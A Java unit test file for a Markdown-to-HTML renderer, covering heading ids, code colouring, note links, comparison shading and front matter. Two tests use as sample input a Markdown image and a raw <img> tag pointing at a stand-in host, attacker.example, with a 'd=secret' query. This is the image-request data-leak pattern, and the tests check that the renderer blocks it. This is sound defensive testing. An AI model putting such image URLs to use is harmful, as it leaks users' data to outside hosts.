package dev.marregui.comando.ui.kit.text;

import dev.marregui.comando.ui.kit.theme.Theme;
import org.junit.jupiter.api.Test;

import java.util.List;
import java.util.Set;

import static org.assertj.core.api.Assertions.assertThat;

/// [MarkdownHtml] renders Markdown to the HTML the panes show, without fetching anything.
/// - A heading gets the id GitHub gives it, numbered on when taken.
/// - An image becomes its alt text; raw HTML images are escaped.
/// - A code block takes the editor's colours for its language, or is plain and escaped.
/// - Links stay links; web addresses and note links in text become links, but not inside a link or code.
/// - Comparison marks shade changed blocks and words.
/// - Front matter shows as a table of facts, and marks still land on the same lines.
class MarkdownHtmlTest {

    /// Ids are lower case, drop punctuation and inline markup, keep letters of any language and `_`, turn each space
    /// into a hyphen, cover setext headings, count on as `-1`, `-1-1`, `-2` as GitHub does, restart per document, and
    /// are given by every renderer; a paragraph has none.
    @Test
    void aHeadingHasTheIdGitHubGivesIt() {
        assertThat(MarkdownHtml.render("## 3. Decisions")).contains("<h2 id=\"3-decisions\">3. Decisions</h2>");
        assertThat(MarkdownHtml.render("# The `LocalImages` class")).contains("<h1 id=\"the-localimages-class\">");
        assertThat(MarkdownHtml.render("### **Bold** _it_ [a link](x.md)")).contains("<h3 id=\"bold-it-a-link\">");
        assertThat(MarkdownHtml.render("## Café & crème: what's left?")).as("letters of any language kept, each space a hyphen")
                .contains("id=\"café--crème-whats-left\"");
        assertThat(MarkdownHtml.render("## snake_case and kebab-case")).contains("id=\"snake_case-and-kebab-case\"");
        assertThat(MarkdownHtml.render("Setext title\n============")).contains("<h1 id=\"setext-title\">");
        assertThat(MarkdownHtml.render("## A\n\n## A\n\n## A-1\n\n## A")).as("a taken id counts on, as GitHub's")
                .contains("id=\"a\"", "id=\"a-1\"", "id=\"a-1-1\"", "id=\"a-2\"");
        assertThat(MarkdownHtml.render("## Notes", null, MarkdownHtml.Pictures.NONE)).as("every renderer")
                .contains("id=\"notes\"");
        assertThat(MarkdownHtml.render("## Notes")).as("ids count from the top of each document").contains("id=\"notes\"");
        assertThat(MarkdownHtml.render("a paragraph")).doesNotContain("id=");
    }

    /// An image renders as its alt text in italics with markup stripped, and its URL appears nowhere, so no request leaks.
    @Test
    void anImageBecomesItsAltTextAndItsUrlIsNotRendered() {
        String html = MarkdownHtml.render("Plan ![status of <b>x</b>](https://attacker.example/p.png?d=secret) done");
        assertThat(html).doesNotContain("<img").doesNotContain("attacker.example").contains("<i>status of x</i>");
    }

    /// An inline `<img>` tag is escaped, not rendered.
    @Test
    void rawHtmlImagesAreEscaped() {
        assertThat(MarkdownHtml.render("<img src=\"https://attacker.example/p.png\">")).doesNotContain("<img");
    }

    /// A Java fence renders in `pre.code` with keywords and strings in the palette's colours, its HTML escaped.
    @Test
    void aCodeBlockTakesTheEditorsColoursForItsLanguage() {
        String html = MarkdownHtml.render("```java\nreturn \"<b>\";\n```\n");
        assertThat(html).contains("<pre class=\"code\"><code>")
                .contains("<font color=\"" + Theme.hex(Theme.content().keyword) + "\">return</font>")
                .contains("<font color=\"" + Theme.hex(Theme.content().string) + "\">\"&lt;b&gt;\"</font>")
                .doesNotContain("<b>");
    }

    /// A fence without a language is escaped and has no colour markup.
    @Test
    void aCodeBlockWithoutALanguageIsPlainAndEscaped() {
        assertThat(MarkdownHtml.render("```\n<script>x</script>\n```\n"))
                .contains("<pre class=\"code\"><code>&lt;script&gt;x&lt;/script&gt;\n</code></pre>")
                .doesNotContain("<font");
    }

    /// A Markdown link renders as an anchor with its target.
    @Test
    void linksStayLinks() {
        assertThat(MarkdownHtml.render("[docs](https://example.org/a)")).contains("href=\"https://example.org/a\">docs</a>");
    }

    /// Marked lines shade their paragraph, list item, table cells and code block in the added colour and a marked word
    /// range in the stronger one, unmarked blocks stay plain, the older side uses the removed colour, and no marks
    /// render as before.
    @Test
    void marksShadeTheChangedBlocksAndTheirChangedWordsAsAComparisonDoes() {
        String md = "# Title\n\nFirst para.\n\nSecond para has words.\n\n- a\n- b\n\n| x | y |\n|---|---|\n| 1 | 2 |\n\n```java\nint x;\n```\n";
        int word = md.indexOf("words");
        MarkdownHtml.Marks marks = new MarkdownHtml.Marks(Set.of(4, 7, 11, 14), List.of(new int[] {word, word + 5}), true);
        String html = MarkdownHtml.render(md, null, MarkdownHtml.Pictures.NONE, marks);
        String line = "background-color: " + Theme.hex(Theme.content().added);
        String strong = "background-color: " + Theme.hex(Theme.content().addedWord);
        assertThat(html).contains("<p style=\"" + line + "\">Second para has <span style=\"" + strong + "\">words</span>.</p>")
                .contains("<li style=\"" + line + "\">b</li>", "<li>a</li>", "<p>First para.</p>", ">Title</h1>")
                .contains("<td style=\"" + line + "\">1</td>", "<td style=\"" + line + "\">2</td>")
                .contains("<pre class=\"code\" style=\"" + line + "\">");

        String older = MarkdownHtml.render("Gone\n", null, MarkdownHtml.Pictures.NONE, new MarkdownHtml.Marks(Set.of(0), List.of(), false));
        assertThat(older).as("the older side in red").contains("<p style=\"background-color: " + Theme.hex(Theme.content().removed) + "\">Gone</p>");
        assertThat(MarkdownHtml.render(md, null, MarkdownHtml.Pictures.NONE, MarkdownHtml.Marks.NONE))
                .as("no marks: as ever").isEqualTo(MarkdownHtml.render(md));
    }

    /// Bare URLs and `[[note]]`/`[[note#h|label]]` in text become anchors, the URL without its trailing period, and no
    /// brackets remain.
    @Test
    void webAddressesAndNoteLinksInTextAreLinks() {
        String html = MarkdownHtml.render("See [[feedback-verification-discipline]], [[notes#setup|the setup]] and https://example.org/a.");
        assertThat(html).contains("<a href=\"comando-note:feedback-verification-discipline\">feedback-verification-discipline</a>",
                "<a href=\"comando-note:notes#setup\">the setup</a>", "href=\"https://example.org/a\">https://example.org/a</a>.");
        assertThat(html).doesNotContain("[[");
    }

    /// A URL that is a link's text, and note or URL text in inline code or a fence, are not linked.
    @Test
    void textInALinkOrCodeStaysAsWritten() {
        assertThat(MarkdownHtml.render("[https://a.b/c](https://x.y)")).contains("href=\"https://x.y\"").doesNotContain("href=\"https://a.b/c\"");
        assertThat(MarkdownHtml.render("`[[name]]` and `https://a.b`")).contains("<code>[[name]]</code>").doesNotContain("<a ");
        assertThat(MarkdownHtml.render("```\n[[name]]\n```")).doesNotContain("<a ");
    }

    /// A memory file's front matter renders as a key/value table before the body, with note links in values, instead of
    /// a rule and a setext heading.
    @Test
    void aMemoryFilesFrontMatterShowsAsItsFactsNotAHeading() {
        String memory = """
                ---
                name: reference-video-transcripts
                description: "How to get a transcript, see [[feedback-ui-requests]]"
                metadata:
                  node_type: memory
                  type: reference
                ---

                Proven 2026-10-22.
                """;
        String html = MarkdownHtml.render(memory);
        assertThat(html).doesNotContain("<h2", "<hr");
        assertThat(html).contains("<td class=\"front-key\" valign=\"top\">name</td><td class=\"front-value\">reference-video-transcripts</td>",
                "metadata.type", "<a href=\"comando-note:feedback-ui-requests\">feedback-ui-requests</a>", "<p>Proven 2026-10-22.</p>");
        assertThat(html.indexOf("front-key")).as("the facts come first").isLessThan(html.indexOf("Proven"));
    }

    /// A mark on a line below front matter shades that line's paragraph, so line numbers count the front matter.
    @Test
    void aComparedTextWithFrontMatterShadesTheSameLines() {
        String text = "---\nname: x\n---\n\nfirst\n\nsecond\n";
        String html = MarkdownHtml.render(text, null, MarkdownHtml.Pictures.NONE, new MarkdownHtml.Marks(Set.of(6), List.of(), true));
        assertThat(html).containsPattern("<p style=\"background-color: [^\"]+\">second</p>").contains("<p>first</p>");
    }
}
